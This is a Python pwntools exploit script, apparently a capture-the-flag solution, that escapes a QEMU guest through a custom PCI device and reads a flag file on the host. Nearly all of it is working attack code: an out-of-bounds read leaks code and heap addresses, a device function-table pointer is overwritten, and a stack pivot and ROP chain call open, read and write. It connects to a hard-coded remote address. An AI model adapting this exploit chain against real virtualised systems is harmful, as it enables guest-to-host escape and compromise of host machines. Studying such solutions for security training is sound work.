from pwn import *
from Crypto.Util.number import bytes_to_long as b2l
#io = remote(b"0.0.0.0",30002)
io = remote("35.221.156.78",30002)

def qemu2guest():
    # read from qemu maria buffer to guest
    io.sendlineafter(b"/root #",b"devmem 0xfebd0000")

def guest2qemu():
    # write into qemu maria buffer form guest
    io.sendlineafter(b"/root #",b"devmem 0xfebd0000 32 0")


# set state.src to guest 0x30000, and state.off to 0xf8
io.sendlineafter(b"/root #",b"devmem 0xfebd0004 32 0x30000")
io.sendlineafter(b"/root #",b"devmem 0xfebd0008 32 0xF8")

# read oob
qemu2guest()

# get PIE leak by leaking memory_region_destructor_none, which is at buffer+0x2000+0x88
io.sendlineafter(b"/root #",b"devmem 0x31f90") # 0x30000+0x2000-0xF8+0x88=0x31f90
io.recvuntil(b"devmem 0x31f90\r\n")
io.recvuntil(b"0x")
pieLeak = io.recv(8)

io.sendlineafter(b"/root #",b"devmem 0x31f94")
io.recvuntil(b"devmem 0x31f94\r\n")
io.recvuntil(b"0x")
pieLeak = io.recv(8) + pieLeak

pie = int(pieLeak,16) - 0x81dae0
log.info("PIE BASE: " + hex(pie))

# leak maria object's buffer and mmio address
# they're not at a constant offset from pie, they're prob at the heap
io.sendlineafter(b"/root #",b"devmem 0x31f08") # 0x30000+0x2000-0xF8=0x31f08
io.recvuntil(b"devmem 0x31f08\r\n")
io.recvuntil(b"0x")
mariaLeak = io.recv(8)

io.sendlineafter(b"/root #",b"devmem 0x31f0c")
io.recvuntil(b"devmem 0x31f0c\r\n")
io.recvuntil(b"0x")
mariaLeak = io.recv(8) + mariaLeak

mariaLeak = int(mariaLeak,16)
buffer = mariaLeak + 0xf546c0
mmio = buffer + 0x2000
log.info("MMIO OBJECT: " + hex(mmio))



# *** EXPLOITATION PLAN ***
# so mmio = buffer+0x2000
# mmio+0x48 points to a table containing maria_mmio_read and maria_mmio_write functions
# we can thus overwrite mmio+0x48 so that it points to controlled memory, which I choose to be at buffer+0xF8
# mmio+0x50 is the opaque pointer as well, when the read/write func is called, both rax and rdi = opaque
# So Im gonna use it to pivot the stack, using the gadget
# 0x00000000007bce54 : push rax ; pop rsp ; nop ; pop rbp ; ret


# gadgets
stackPivot = pie+0x7bce54
popRdi = pie+0x632c5d
popRsi = pie+0x830ec8
popRdx = pie+0x47f5c8
openPlt = pie+0x30a270
readPlt = pie+0x30d460
writePlt = pie+0x30dc70

# addresses
newOps = buffer + 0xF8
opaque = buffer + 0x10F8 # new stack address, so to write to new stack, just write at 0x30000+0x1000
log.info("NEW MMIO OPERATIONS TABLE: " + hex(newOps))


# 0x30000+0x2000-0xF8=0x31f08 is the start of mmio, thus 0x31f08+0x48 = 0x31f50 is where the pointer is at
io.sendlineafter(b"/root #",b"devmem 0x31f50 64 " + hex(newOps).encode())
log.info("MMIO OPERATIONS PTR: " + hex(mmio+0x48))

# overwrite opaque pointer with own valaue
io.sendlineafter(b"/root #",b"devmem 0x31f58 64 " + hex(opaque).encode())


newRead = stackPivot
newWrite = 0x31371337
# setup the new read and write functions
io.sendlineafter(b"/root #",b"devmem 0x30000 64 " + hex(newRead).encode())
io.sendlineafter(b"/root #",b"devmem 0x30008 64 " + hex(newWrite).encode())


# write flag str at buffer+0x1f8
flagStr = buffer+0x1f8

# /home/user/flag
io.sendlineafter(b"/root #",b"devmem 0x30100 64 " + hex(b2l(b"su/emoh/")).encode())
io.sendlineafter(b"/root #",b"devmem 0x30108 64 " + hex(b2l(b"\x00galf/re")).encode())



# write rop chain into memory
rop  = [0,popRdi,flagStr,popRsi,0,popRdx,777,openPlt]
rop += [popRdi,0xa,popRsi,flagStr,popRdx,0x1000,readPlt]
rop += [popRdi,1,popRsi,flagStr,popRdx,0x1000,writePlt]
print(hex(stackPivot))


for index,i in enumerate(rop):
    io.sendlineafter(b"/root #",b"devmem " + hex(0x31000 + index*8).encode() + b" 64 " + hex(i).encode())


# load from guest physical memory into qemu process memory
guest2qemu()

# get flag
io.sendlineafter(b"/root #",b"devmem 0xfebd0000")
io.interactive()

